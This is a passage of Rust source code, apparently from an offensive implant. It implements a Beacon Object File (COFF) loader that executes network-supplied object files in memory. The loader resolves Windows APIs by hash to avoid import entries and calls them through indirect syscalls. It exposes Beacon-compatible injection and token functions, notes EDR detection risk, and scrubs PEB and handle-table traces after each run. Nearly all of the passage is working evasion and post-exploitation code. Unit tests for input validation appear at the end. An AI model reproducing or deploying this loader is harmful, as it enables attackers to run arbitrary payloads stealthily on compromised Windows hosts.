    let mut d = dst;
    let mut s = src;
    while *s != 0 {
        *d = *s;
        d = d.add(1);
        s = s.add(1);
    }
    *d = 0;
    dst
}

unsafe extern "C" fn crt_strlen(s: *const i8) -> usize {
    let mut len = 0usize;
    let mut p = s;
    while *p != 0 {
        len += 1;
        p = p.add(1);
    }
    len
}

unsafe extern "C" fn crt_sprintf(dst: *mut i8, fmt: *const i8) -> i32 {
    // Minimal: just copy fmt if no % (most BOF uses BeaconPrintf).
    let fmt_cstr = std::ffi::CStr::from_ptr(fmt);
    let bytes = fmt_cstr.to_bytes();
    let copy_len = std::cmp::min(bytes.len(), 1023);
    std::ptr::copy_nonoverlapping(bytes.as_ptr(), dst as *mut u8, copy_len);
    *dst.add(copy_len) = 0;
    copy_len as i32
}

unsafe extern "C" fn crt_printf(fmt: *const i8) -> i32 {
    let fmt_cstr = std::ffi::CStr::from_ptr(fmt);
    let bytes = fmt_cstr.to_bytes();
    append_output(bytes);
    bytes.len() as i32
}

unsafe extern "C" fn crt_snprintf(dst: *mut i8, count: usize, fmt: *const i8) -> i32 {
    let fmt_cstr = std::ffi::CStr::from_ptr(fmt);
    let bytes = fmt_cstr.to_bytes();
    let copy_len = std::cmp::min(bytes.len(), count.saturating_sub(1));
    std::ptr::copy_nonoverlapping(bytes.as_ptr(), dst as *mut u8, copy_len);
    *dst.add(copy_len) = 0;
    copy_len as i32
}

// ── Heap API — runtime-resolved via pe_resolve (no IAT entries) ────────────

type FnGetProcessHeap = unsafe extern "system" fn() -> *mut c_void;
type FnHeapAlloc = unsafe extern "system" fn(*mut c_void, u32, usize) -> *mut c_void;
type FnHeapFree = unsafe extern "system" fn(*mut c_void, u32, *mut c_void) -> i32;
type FnHeapReAlloc = unsafe extern "system" fn(*mut c_void, u32, *mut c_void, usize) -> *mut c_void;

/// Resolve a kernel32 heap function by name hash at runtime.
#[cfg(windows)]
unsafe fn resolve_heap_fn<T>(name: &[u8]) -> Option<T>
where
    T: Copy,
{
    let k32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
    let addr = pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(name))?;
    Some(std::mem::transmute_copy(&addr))
}

/// Get the current process heap via runtime-resolved GetProcessHeap.
#[cfg(windows)]
unsafe fn get_process_heap() -> *mut c_void {
    let f: FnGetProcessHeap = resolve_heap_fn(b"GetProcessHeap\0")
        .expect("coff_loader: GetProcessHeap resolution failed");
    f()
}

// ── Symbol table ─────────────────────────────────────────────────────────────

/// A named symbol with its address.
struct SymbolEntry {
    name: String,
    address: *const c_void,
}

/// Build the internal symbol table with Beacon-compatible functions.
fn build_internal_symbols() -> Vec<SymbolEntry> {
    let mut symbols = Vec::new();

    // Beacon API
    macro_rules! sym {
        ($name:expr, $func:ident) => {
            symbols.push(SymbolEntry {
                name: $name.to_string(),
                address: $func as *const c_void,
            });
        };
    }

    sym!("BeaconDataParse", beacon_data_parse);
    sym!("BeaconDataInt", beacon_data_int);
    sym!("BeaconDataShort", beacon_data_short);
    sym!("BeaconDataLength", beacon_data_length);
    sym!("BeaconDataExtract", beacon_data_extract);
    sym!("BeaconPrintf", beacon_printf);
    sym!("BeaconOutputPrintf", beacon_output_printf);
    sym!("BeaconOutput", beacon_output);
    sym!("BeaconUseToken", beacon_use_token);
    sym!("BeaconRevertToken", beacon_revert_token);
    sym!("BeaconGetSpawnTo", beacon_get_spawn_to);
    sym!(
        "BeaconSpawnTemporaryProcess",
        beacon_spawn_temporary_process
    );
    sym!("BeaconInjectProcess", beacon_inject_process);
    sym!(
        "BeaconInjectTemporaryProcess",
        beacon_inject_temporary_process
    );
    sym!("BeaconCleanupProcess", beacon_cleanup_process);
    sym!("toNative", to_native);

    // MSVCRT functions
    sym!("MSVCRT$malloc", crt_malloc);
    sym!("MSVCRT$free", crt_free);
    sym!("MSVCRT$calloc", crt_calloc);
    sym!("MSVCRT$realloc", crt_realloc);
    sym!("MSVCRT$memset", crt_memset);
    sym!("MSVCRT$memcpy", crt_memcpy);
    sym!("MSVCRT$strcpy", crt_strcpy);
    sym!("MSVCRT$strlen", crt_strlen);
    sym!("MSVCRT$sprintf", crt_sprintf);
    sym!("MSVCRT$printf", crt_printf);
    sym!("MSVCRT$_snprintf", crt_snprintf);

    symbols
}

/// Resolve a `DLL$Function` symbol by dynamically loading the DLL and finding
/// the function via pe_resolve (no IAT entries).
unsafe fn resolve_dynamic_symbol(name: &str) -> Option<*const c_void> {
    let parts: Vec<&str> = name.splitn(2, '$').collect();
    if parts.len() != 2 {
        return None;
    }
    let dll_name = parts[0];
    let func_name = parts[1];

    // Build a null-terminated UTF-16 wide string for the DLL name.
    let dll_name_wide: Vec<u16> = dll_name.encode_utf16().chain(std::iter::once(0)).collect();

    // Try to find the module already loaded in the PEB.
    let module = match pe_resolve::get_module_handle_by_hash(pe_resolve::hash_wstr(
        &dll_name_wide[..dll_name_wide.len() - 1],
    )) {
        Some(base) => base as *mut c_void,
        None => {
            // Module not loaded yet — resolve LoadLibraryW via pe_resolve and load it.
            let kernel32 =
                match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) {
                    Some(b) => b,
                    None => {
                        tracing::warn!("[coff_loader] cannot resolve kernel32");
                        return None;
                    }
                };
            let llw_addr = match pe_resolve::get_proc_address_by_hash(
                kernel32,
                pe_resolve::hash_str(b"LoadLibraryW\0"),
            ) {
                Some(a) => a,
                None => {
                    tracing::warn!("[coff_loader] cannot resolve LoadLibraryW");
                    return None;
                }
            };
            let load_library_w: unsafe extern "system" fn(*const u16) -> *mut c_void =
                std::mem::transmute(llw_addr);
            let mod_handle = load_library_w(dll_name_wide.as_ptr());
            if mod_handle.is_null() {
                tracing::warn!("[coff_loader] LoadLibraryW('{}') failed", dll_name);
                return None;
            }
            mod_handle
        }
    };

    // Build a null-terminated C string for the function name hash.
    let func_bytes = format!("{}\0", func_name);
    let proc = match pe_resolve::get_proc_address_by_hash(
        module as usize,
        pe_resolve::hash_str(func_bytes.as_bytes()),
    ) {
        Some(addr) => addr as *const c_void,
        None => {
            tracing::warn!(
                "[coff_loader] cannot resolve '{}' in '{}'",
                func_name,
                dll_name
            );
            return None;
        }
    };

    tracing::debug!("[coff_loader] resolved {} at {:#x}", name, proc as usize);
    Some(proc)
}

/// Look up a symbol name against the internal table first, then dynamic.
fn resolve_symbol(name: &str, internals: &[SymbolEntry]) -> Option<*const c_void> {
    // Check internal symbols.
    for sym in internals {
        if sym.name == name {
            return Some(sym.address);
        }
    }

    // Check for DLL$Function pattern.
    if name.contains('$') {
        unsafe { resolve_dynamic_symbol(name) }
    } else {
        None
    }
}

// ── COFF name helper ─────────────────────────────────────────────────────────

/// Extract a COFF symbol name (8-byte inline or string-table offset).
fn coff_symbol_name(symbol: &CoffSymbol, string_table: &[u8]) -> String {
    // If the first 4 bytes are zero, the name is an offset into the string table.
    if symbol.name[0] == 0 && symbol.name[1] == 0 && symbol.name[2] == 0 && symbol.name[3] == 0 {
        let offset = u32::from_le_bytes([
            symbol.name[4],
            symbol.name[5],
            symbol.name[6],
            symbol.name[7],
        ]) as usize;
        if offset >= 4 && offset < string_table.len() {
            // Read null-terminated string from the string table.
            let start = offset;
            let end = string_table[start..]
                .iter()
                .position(|&b| b == 0)
                .map(|p| start + p)
                .unwrap_or(string_table.len());
            String::from_utf8_lossy(&string_table[start..end]).to_string()
        } else {
            String::new()
        }
    } else {
        // Inline 8-byte name (may not be null-terminated).
        let end = symbol.name.iter().position(|&b| b == 0).unwrap_or(8);
        String::from_utf8_lossy(&symbol.name[..end]).to_string()
    }
}

// ── Argument packing ─────────────────────────────────────────────────────────

/// Pack arguments into the BOF format: each arg is [4-byte LE length][data].
fn pack_args(args: &[String]) -> Vec<u8> {
    let mut packed = Vec::new();
    for arg in args {
        let len = arg.len() as u32;
        packed.extend_from_slice(&len.to_le_bytes());
        packed.extend_from_slice(arg.as_bytes());
    }
    packed
}

// ── COFF loading and execution ───────────────────────────────────────────────

/// Result of a BOF execution.
pub struct BofResult {
    /// Captured output (UTF-8, lossy-decoded).
    pub output: String,
}

/// Parse, load, and execute a BOF.
///
/// # Arguments
///
/// * `coff_bytes` — Raw bytes of the COFF object file (`.o` / `.obj`).
/// * `args` — Arguments to pass to the BOF entry point.
/// * `timeout_secs` — Wall-clock timeout.  `None` defaults to 60 s.
///
/// # Returns
///
/// A `BofResult` with captured output.
pub unsafe fn execute_bof(
    coff_bytes: &[u8],
    args: &[String],
    timeout_secs: Option<u64>,
) -> Result<BofResult, String> {
    // ── Input validation ────────────────────────────────────────────────
    if coff_bytes.is_empty() {
        return Err("COFF bytes are empty".to_string());
    }
    if coff_bytes.len() > MAX_COF_SIZE {
        return Err(format!(
            "COFF too large: {} bytes (max {} bytes)",
            coff_bytes.len(),
            MAX_COF_SIZE
        ));
    }
    if args.len() > MAX_ARGS {
        return Err(format!(
            "too many arguments: {} (max {})",
            args.len(),
            MAX_ARGS
        ));
    }

    // ── Parse COFF header ───────────────────────────────────────────────
    if coff_bytes.len() < std::mem::size_of::<CoffHeader>() {
        return Err("COFF data too small for header".to_string());
    }
    // P2-28: Use read_unaligned — COFF bytes from the network may not be
    // aligned to the natural alignment of CoffHeader.
    let header = std::ptr::read_unaligned(coff_bytes.as_ptr() as *const CoffHeader);

    // Validate machine type.
    match header.machine {
        IMAGE_FILE_MACHINE_AMD64 | IMAGE_FILE_MACHINE_I386 => {}
        _ => {
            return Err(format!(
                "unsupported COFF machine type: {:#06X} (expected AMD64={:#06X} or I386={:#06X})",
                header.machine, IMAGE_FILE_MACHINE_AMD64, IMAGE_FILE_MACHINE_I386
            ));
        }
    }
    let _is_amd64 = header.machine == IMAGE_FILE_MACHINE_AMD64;

    tracing::info!(
        "[coff_loader] COFF: machine={:#06X} sections={} symbols={}",
        header.machine,
        header.number_of_sections,
        header.number_of_symbols,
    );

    // ── Parse section headers ───────────────────────────────────────────
    let section_offset =
        std::mem::size_of::<CoffHeader>() + header.size_of_optional_header as usize;
    let sections: Vec<CoffSection> = {
        let mut secs = Vec::with_capacity(header.number_of_sections as usize);
        for i in 0..header.number_of_sections {
            let off = section_offset + i as usize * std::mem::size_of::<CoffSection>();
            if off + std::mem::size_of::<CoffSection>() > coff_bytes.len() {
                // P2-29: Return an error instead of panicking on malformed input.
                return Err("COFF section header out of bounds".to_string());
            }
            // P2-28: read_unaligned — section data may not be naturally aligned.
            secs.push(std::ptr::read_unaligned(
                coff_bytes.as_ptr().add(off) as *const CoffSection
            ));
        }
        secs
    };

    // ── Parse symbol table ──────────────────────────────────────────────
    let sym_offset = header.pointer_to_symbol_table as usize;
    let sym_count = header.number_of_symbols as usize;
    let sym_size = std::mem::size_of::<CoffSymbol>();
    let symbols: Vec<CoffSymbol> = {
        let mut syms = Vec::with_capacity(sym_count);
        for i in 0..sym_count {
            let off = sym_offset + i * sym_size;
            if off + sym_size > coff_bytes.len() {
                // P2-29: Return an error instead of panicking on malformed input.
                return Err("COFF symbol table out of bounds".to_string());
            }
            // P2-28: read_unaligned — symbol data may not be naturally aligned.
            syms.push(std::ptr::read_unaligned(
                coff_bytes.as_ptr().add(off) as *const CoffSymbol
            ));
        }
        syms
    };

    // ── Parse string table ──────────────────────────────────────────────
    let str_table_offset = sym_offset + sym_count * sym_size;
    let string_table = if str_table_offset < coff_bytes.len() {
        &coff_bytes[str_table_offset..]
    } else {
        &[]
    };

    // ── Build internal symbol table ─────────────────────────────────────
    let internal_symbols = build_internal_symbols();

    // ── Calculate total memory needed ───────────────────────────────────
    // Sections are laid out sequentially.  Use VirtualSize (or SizeOfRawData)
    // to compute offsets.
    let mut section_offsets: Vec<usize> = Vec::new();
    let mut current_offset: usize = 0;

    for section in &sections {
        let section_size = std::cmp::max(
            section.virtual_size as usize,
            section.size_of_raw_data as usize,
        );
        // Align to 4-byte boundary.
        let aligned_size = (section_size + 3) & !3;
        section_offsets.push(current_offset);
        current_offset += aligned_size;
    }
    let total_size = current_offset;

    if total_size == 0 {
        return Err("COFF has no sections to load".to_string());
    }

    tracing::info!(
        "[coff_loader] total memory required: {} bytes across {} sections",
        total_size,
        sections.len()
    );

    // ── Allocate memory ─────────────────────────────────────────────────
    // VirtualAlloc → NtAllocateVirtualMemory
    let mut base_ptr: usize = 0;
    let mut region_size = total_size;
    let alloc_status = crate::syscall!(
        "NtAllocateVirtualMemory",
        (-1isize) as u64,                  // NtCurrentProcess()
        &mut base_ptr as *mut _ as u64,    // BaseAddress (in/out)
        0u64,                              // ZeroBits
        &mut region_size as *mut _ as u64, // RegionSize (in/out)
        (MEM_COMMIT | MEM_RESERVE) as u64, // AllocationType
        PAGE_READWRITE as u64, // PAGE_READWRITE — flipped to per-section protections after relocations
    );
    if alloc_status.is_err() || alloc_status.unwrap() < 0 || base_ptr == 0 {
        return Err("NtAllocateVirtualMemory failed for COFF memory".to_string());
    }
    let base = base_ptr as *mut c_void;
    tracing::info!(
        "[coff_loader] allocated COFF memory at {:#x}",
        base as usize
    );

    // Zero the entire region.
    std::ptr::write_bytes(base as *mut u8, 0, total_size);

    // ── Map sections ────────────────────────────────────────────────────
    for (i, section) in sections.iter().enumerate() {
        let offset = section_offsets[i];
        let dst = (base as usize + offset) as *mut u8;
        let raw_size = section.size_of_raw_data as usize;
        let raw_offset = section.pointer_to_raw_data as usize;

        if raw_size > 0 && raw_offset + raw_size <= coff_bytes.len() {
            std::ptr::copy_nonoverlapping(coff_bytes.as_ptr().add(raw_offset), dst, raw_size);
        }
    }

    // ── Process relocations ─────────────────────────────────────────────
    for (i, section) in sections.iter().enumerate() {
        let section_base = base as usize + section_offsets[i];
        let reloc_count = section.number_of_relocations as usize;
        let reloc_offset = section.pointer_to_relocations as usize;
        let reloc_size = std::mem::size_of::<CoffRelocation>();

        for j in 0..reloc_count {
            let roff = reloc_offset + j * reloc_size;
            if roff + reloc_size > coff_bytes.len() {
                continue;
            }
            let reloc =
                std::ptr::read_unaligned(coff_bytes.as_ptr().add(roff) as *const CoffRelocation);
            let sym_idx = reloc.symbol_table_index as usize;
            if sym_idx >= symbols.len() {
                tracing::warn!(
                    "[coff_loader] relocation references invalid symbol index {}",
                    sym_idx
                );
                continue;
            }
            let symbol = &symbols[sym_idx];
            let sym_name = coff_symbol_name(symbol, string_table);

            // Resolve symbol address.
            let sym_addr = if symbol.section_number > 0 {
                // Internal symbol — points to a section.
                let sec_idx = (symbol.section_number - 1) as usize;
                if sec_idx < sections.len() {
                    base as usize + section_offsets[sec_idx] + symbol.value as usize
                } else {
                    tracing::warn!(
                        "[coff_loader] symbol '{}' references invalid section {}",
                        sym_name,
                        symbol.section_number
                    );
                    continue;
                }
            } else {
                // External symbol — resolve from table.
                match resolve_symbol(&sym_name, &internal_symbols) {
                    Some(addr) => addr as usize,
                    None => {
                        tracing::warn!("[coff_loader] unresolved external symbol: '{}'", sym_name);
                        continue;
                    }
                }
            };

            // Apply relocation at the target offset within the section.
            let target_ptr = (section_base + reloc.virtual_address as usize) as *mut u8;
            let reloc_type = reloc.r#type;

            // Validate relocation target is within the section's allocated memory
            let write_size = match reloc_type {
                IMAGE_REL_AMD64_ADDR64 => 8usize,
                IMAGE_REL_AMD64_ADDR32NB => 4usize,
                IMAGE_REL_AMD64_REL32 => 4usize,
                IMAGE_REL_AMD64_REL32_1 => 4usize,
                IMAGE_REL_AMD64_REL32_2 => 4usize,
                IMAGE_REL_AMD64_REL32_3 => 4usize,
                IMAGE_REL_AMD64_REL32_4 => 4usize,
                IMAGE_REL_AMD64_REL32_5 => 4usize,
                IMAGE_REL_I386_DIR32 => 4usize,
                IMAGE_REL_I386_REL32 => 4usize,
                _ => 0,
            };
            if write_size == 0 {
                tracing::warn!(
                    "[coff_loader] unsupported relocation type {} for symbol '{}' at offset {:#x}",
                    reloc_type,
                    sym_name,
                    roff
                );
                continue;
            }
            if reloc.virtual_address as usize + write_size > section.virtual_size as usize {
                return Err(format!(
                    "relocation at offset {:#x} targets address {:#x} which is outside section (size {:#x})",
                    roff, reloc.virtual_address, section.virtual_size
                ));
            }

            match reloc.r#type {
                // AMD64 relocations
                IMAGE_REL_AMD64_ADDR64 => {
                    *(target_ptr as *mut u64) = sym_addr as u64;
                }
                IMAGE_REL_AMD64_ADDR32NB => {
                    if sym_addr > 0xFFFFFFFF {
                        tracing::warn!(
                            "[coff_loader] ADDR32NB relocation truncates 64-bit address {:#x}",
                            sym_addr
                        );
                    }
                    *(target_ptr as *mut u32) = sym_addr as u32;
                }
                IMAGE_REL_AMD64_REL32 => {
                    let target_va = section_base + reloc.virtual_address as usize;
                    let rel = (sym_addr as i64 - target_va as i64 - 4) as i32;
                    *(target_ptr as *mut i32) = rel;
                }
                IMAGE_REL_AMD64_REL32_1 => {
                    let target_va = section_base + reloc.virtual_address as usize;
                    let rel = (sym_addr as i64 - target_va as i64 - 5) as i32;
                    *(target_ptr as *mut i32) = rel;
                }
                IMAGE_REL_AMD64_REL32_2 => {
                    let target_va = section_base + reloc.virtual_address as usize;
                    let rel = (sym_addr as i64 - target_va as i64 - 6) as i32;
                    *(target_ptr as *mut i32) = rel;
                }
                IMAGE_REL_AMD64_REL32_3 => {
                    let target_va = section_base + reloc.virtual_address as usize;
                    let rel = (sym_addr as i64 - target_va as i64 - 7) as i32;
                    *(target_ptr as *mut i32) = rel;
                }
                IMAGE_REL_AMD64_REL32_4 => {
                    let target_va = section_base + reloc.virtual_address as usize;
                    let rel = (sym_addr as i64 - target_va as i64 - 8) as i32;
                    *(target_ptr as *mut i32) = rel;
                }
                IMAGE_REL_AMD64_REL32_5 => {
                    let target_va = section_base + reloc.virtual_address as usize;
                    let rel = (sym_addr as i64 - target_va as i64 - 9) as i32;
                    *(target_ptr as *mut i32) = rel;
                }
                // i386 relocations
                IMAGE_REL_I386_DIR32 => {
                    *(target_ptr as *mut u32) = sym_addr as u32;
                }
                IMAGE_REL_I386_REL32 => {
                    let target_va = section_base + reloc.virtual_address as usize;
                    let rel = sym_addr as i32 - target_va as i32 - 4;
                    *(target_ptr as *mut i32) = rel;
                }
                _ => unreachable!(),
            }
        }
    }

    // ── Set section protections ─────────────────────────────────────────
    for (i, section) in sections.iter().enumerate() {
        let offset = section_offsets[i];
        let section_size = std::cmp::max(
            section.virtual_size as usize,
            section.size_of_raw_data as usize,
        );
        if section_size == 0 {
            continue;
        }

        // Map COFF section characteristics to Windows page protections.
        // The initial allocation was PAGE_READWRITE; now that relocations
        // are applied we set the correct per-section protection.
        //
        // Note: sections with both EXECUTE+WRITE require PAGE_EXECUTE_READWRITE.
        // This is rare in well-formed BOFs but some JIT-style or self-modifying
        // code sections request it.  The EDR risk is per-section, not the
        // entire BOF allocation (which would be far louder).
        let is_executable = section.characteristics & IMAGE_SCN_MEM_EXECUTE != 0;
        let is_writable = section.characteristics & IMAGE_SCN_MEM_WRITE != 0;
        let prot = match (is_executable, is_writable) {
            (true, false) => PAGE_EXECUTE_READ, // RX — most .text sections
            (true, true) => 0x40u32,            // RWX — unavoidable for RW+RX sections
            (false, true) => PAGE_READWRITE,    // RW — .data/.bss sections
            (false, false) => PAGE_READONLY,    // RO — .rdata sections
        };

        let mut base_addr = (base as usize + offset) as *mut c_void;
        let mut sec_size = section_size;
        let mut old_prot: u32 = 0;
        let _ = crate::syscall!(
            "NtProtectVirtualMemory",
            (-1isize) as u64,                 // NtCurrentProcess()
            &mut base_addr as *mut _ as u64,  // BaseAddress (in/out)
            &mut sec_size as *mut _ as u64,   // RegionSize (in/out)
            prot as u64,                      // NewProtect
            &mut old_prot as *mut u32 as u64, // OldProtect
        );
    }

    // P3-15: Flush instruction cache after section protection changes.
    //
    // The COFF sections were written while mapped RW and are now being
    // flipped to RX.  On x86/x64 the I-cache is coherent with data
    // writes, so this is a no-op.  On ARM64 (or virtualized environments
    // with split TLBs), stale cached instructions may be executed without
    // this flush.  Non-fatal: log and continue regardless.
    {
        let flush_status = crate::syscall!(
            "NtFlushInstructionCache",
            (-1isize) as u64,     // NtCurrentProcess()
            base as usize as u64, // COFF base address
            total_size as u64,    // total mapped size
        );
        match flush_status {
            Ok(s) if s < 0 => {
                tracing::warn!(
                    "coff_loader: NtFlushInstructionCache returned 0x{:08X} (non-fatal on x64)",
                    s as u32
                );
            }
            Err(_) => {
                tracing::debug!("coff_loader: NtFlushInstructionCache syscall not available");
            }
            _ => {} // success (status >= 0)
        }
    }

    // ── Find "go" entry point ───────────────────────────────────────────
    let mut go_addr: Option<usize> = None;
    for (_idx, symbol) in symbols.iter().enumerate() {
        // Skip auxiliary symbols.
        if symbol.storage_class == 0 {
            continue;
        }
        let name = coff_symbol_name(symbol, string_table);
        if name == "go" && symbol.section_number > 0 {
            let sec_idx = (symbol.section_number - 1) as usize;
            if sec_idx < sections.len() {
                let addr = base as usize + section_offsets[sec_idx] + symbol.value as usize;
                go_addr = Some(addr);
                tracing::info!(
                    "[coff_loader] found 'go' entry point at {:#x} (section {}, offset {:#x})",
                    addr,
                    sec_idx,
                    symbol.value
                );
                break;
            }
        }
    }

    let go_addr = match go_addr {
        Some(a) => a,
        None => {
            // Free COFF memory before returning.
            let mut base_addr = base as usize;
            let mut free_size: usize = 0;
            let _ = crate::syscall!(
                "NtFreeVirtualMemory",
                (-1isize) as u64,
                &mut base_addr as *mut _ as u64,
                &mut free_size as *mut _ as u64,
                MEM_RELEASE as u64,
            );
            return Err("COFF does not contain a 'go' symbol (entry point)".to_string());
        }
    };

    // ── Prepare arguments ───────────────────────────────────────────────
    let packed_args = pack_args(args);
    let (args_ptr, args_len) = if packed_args.is_empty() {
        (std::ptr::null_mut(), 0i32)
    } else {
        // Allocate a buffer that the BOF can read.
        let mut arg_buf_ptr: usize = 0;
        let mut arg_region_size = packed_args.len();
        let arg_alloc_status = crate::syscall!(
            "NtAllocateVirtualMemory",
            (-1isize) as u64,
            &mut arg_buf_ptr as *mut _ as u64,
            0u64,
            &mut arg_region_size as *mut _ as u64,
            (MEM_COMMIT | MEM_RESERVE) as u64,
            PAGE_READWRITE as u64,
        );
        if arg_alloc_status.is_err() || arg_alloc_status.unwrap() < 0 || arg_buf_ptr == 0 {
            let mut base_addr = base as usize;
            let mut free_size: usize = 0;
            let _ = crate::syscall!(
                "NtFreeVirtualMemory",
                (-1isize) as u64,
                &mut base_addr as *mut _ as u64,
                &mut free_size as *mut _ as u64,
                MEM_RELEASE as u64,
            );
            return Err("NtAllocateVirtualMemory failed for BOF args".to_string());
        }
        let arg_buf = arg_buf_ptr as *mut c_void;
        std::ptr::copy_nonoverlapping(packed_args.as_ptr(), arg_buf as *mut u8, packed_args.len());
        (arg_buf as *mut u8, packed_args.len() as i32)
    };

    // ── Initialize output buffer ────────────────────────────────────────
    ensure_output_buffer();

    // ── Execute BOF on a thread ─────────────────────────────────────────
    let timeout = timeout_secs.unwrap_or(DEFAULT_TIMEOUT_SECS);
    let _go_fn: extern "C" fn(*mut u8, i32) = std::mem::transmute(go_addr);

    // CreateThread → NtCreateThreadEx (indirect syscall, no IAT entry)
    let mut thread_handle_raw: usize = 0;
    let thread_status = crate::syscall!(
        "NtCreateThreadEx",
        &mut thread_handle_raw as *mut _ as u64, // ThreadHandle
        THREAD_WAIT_ACCESS,                      // minimal thread access
        std::ptr::null::<u64>() as u64,          // ObjectAttributes
        (-1isize) as u64,                        // NtCurrentProcess()
        go_addr as u64,                          // StartRoutine
        args_ptr as *mut c_void as u64,          // Argument
        0u64,                                    // CreateSuspended
        0u64,                                    // ZeroBits
        0u64,                                    // StackSize
        0u64,                                    // MaxStackSize
        std::ptr::null::<u64>() as u64,          // AttributeSet
    );

    if thread_status.is_err() || thread_status.unwrap() < 0 || thread_handle_raw == 0 {
        // Cleanup.
        if !args_ptr.is_null() {
            let mut arg_addr = args_ptr as usize;
            let mut free_sz: usize = 0;
            let _ = crate::syscall!(
                "NtFreeVirtualMemory",
                (-1isize) as u64,
                &mut arg_addr as *mut _ as u64,
                &mut free_sz as *mut _ as u64,
                MEM_RELEASE as u64,
            );
        }
        let mut base_addr = base as usize;
        let mut free_size: usize = 0;
        let _ = crate::syscall!(
            "NtFreeVirtualMemory",
            (-1isize) as u64,
            &mut base_addr as *mut _ as u64,
            &mut free_size as *mut _ as u64,
            MEM_RELEASE as u64,
        );
        return Err("NtCreateThreadEx failed for BOF execution".to_string());
    }
    let thread_handle = thread_handle_raw as *mut c_void;

    // Wait with timeout.
    // WaitForSingleObject → NtWaitForSingleObject (indirect syscall)
    let timeout_100ns: i64 = -((timeout as i64) * 10_000_000);
    let wait_status = crate::syscall!(
        "NtWaitForSingleObject",
        thread_handle as u64,
        0u64, // Alertable = FALSE
        &timeout_100ns as *const _ as u64,
    );
    let timed_out = wait_status.is_err() || wait_status.unwrap() != 0;

    if timed_out {
        tracing::warn!("[coff_loader] BOF timed out after {}s", timeout);
        // TerminateThread is dangerous but necessary for timeout.
        windows_sys::Win32::System::Threading::TerminateThread(thread_handle as *mut _, 1);
    }

    // ── Collect output ──────────────────────────────────────────────────
    let output_bytes = take_output();
    let output = String::from_utf8_lossy(&output_bytes).to_string();

    // ── Cleanup ─────────────────────────────────────────────────────────
    // CloseHandle → NtClose
    let _ = crate::syscall!("NtClose", thread_handle as u64);

    // Free args buffer.
    if !args_ptr.is_null() {
        // Zero args before freeing.
        std::ptr::write_bytes(args_ptr, 0, args_len as usize);
        let mut arg_addr = args_ptr as usize;
        let mut free_sz: usize = 0;
        let _ = crate::syscall!(
            "NtFreeVirtualMemory",
            (-1isize) as u64,
            &mut arg_addr as *mut _ as u64,
            &mut free_sz as *mut _ as u64,
            MEM_RELEASE as u64,
        );
    }

    // Zero and free COFF memory.
    std::ptr::write_bytes(base as *mut u8, 0, total_size);
    let mut base_addr = base as usize;
    let mut free_size: usize = 0;
    let _ = crate::syscall!(
        "NtFreeVirtualMemory",
        (-1isize) as u64,
        &mut base_addr as *mut _ as u64,
        &mut free_size as *mut _ as u64,
        MEM_RELEASE as u64,
    );

    // Free output buffer.
    free_output_buffer();

    // Memory hygiene — scrub PEB traces in case BOF loaded any DLLs.
    crate::memory_hygiene::scrub_peb_traces();
    crate::memory_hygiene::scrub_handle_table();

    tracing::info!(
        "[coff_loader] BOF execution complete, {} bytes output",
        output_bytes.len()
    );

    Ok(BofResult { output })
}

// ── Tests ────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn input_validation_rejects_empty() {
        let result = unsafe { execute_bof(&[], &[], None) };
        match result {
            Ok(_) => panic!("expected empty BOF to be rejected"),
            Err(e) => assert!(e.contains("empty")),
        }
    }

    #[test]
    fn input_validation_rejects_oversized() {
        let big = vec![0u8; MAX_COF_SIZE + 1];
        let result = unsafe { execute_bof(&big, &[], None) };
        match result {
            Ok(_) => panic!("expected oversized BOF to be rejected"),
            Err(e) => assert!(e.contains("too large")),
        }
    }

    #[test]
    fn input_validation_rejects_too_many_args() {
        let args: Vec<String> = (0..MAX_ARGS + 1).map(|i| format!("arg{}", i)).collect();
        let result = unsafe { execute_bof(&[0u8; 100], &args, None) };
        match result {
            Ok(_) => panic!("expected too many BOF args to be rejected"),
            Err(e) => assert!(e.contains("too many arguments")),
        }
    }

    #[test]
    fn pack_args_format() {
        let args = vec!["hello".to_string(), "world".to_string()];
        let packed = pack_args(&args);
        // First arg: length (5 as LE u32) + "hello"
        assert_eq!(&packed[0..4], &5u32.to_le_bytes());
        assert_eq!(&packed[4..9], b"hello");
        // Second arg: length (5 as LE u32) + "world"
        assert_eq!(&packed[9..13], &5u32.to_le_bytes());
        assert_eq!(&packed[13..18], b"world");
    }

    #[test]
    fn coff_symbol_name_inline() {
        let mut symbol = unsafe { std::mem::zeroed::<CoffSymbol>() };
        symbol.name[..5].copy_from_slice(b"go\x00\x00\x00");
        let name = coff_symbol_name(&symbol, &[]);
        assert_eq!(name, "go");
    }

    #[test]
    fn dynamic_symbol_pattern() {
        // Verify the split logic works.
        let parts: Vec<&str> = "KERNEL32$GetComputerNameA".splitn(2, '$').collect();
        assert_eq!(parts, vec!["KERNEL32", "GetComputerNameA"]);
    }
}
